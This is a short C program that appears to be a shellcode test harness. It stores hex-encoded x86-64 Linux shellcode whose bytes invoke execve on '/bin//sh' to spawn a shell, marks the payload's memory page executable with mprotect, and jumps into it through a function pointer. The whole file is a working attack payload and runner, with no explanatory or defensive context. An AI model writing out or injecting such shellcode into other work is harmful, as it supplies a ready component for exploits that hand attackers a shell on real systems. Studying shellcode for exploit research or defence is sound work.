#include <sys/mman.h>
#include <stdint.h>
#include <string.h>
#include <stdio.h>

char code[] = "\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56"
              "\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05";

int main(){
    printf("Length: %d\n", strlen(code));

    mprotect((void *)((uint64_t)code & ~4095), 4096, PROT_READ|PROT_EXEC);
      (*(void(*)()) code)();
        return 0;
}
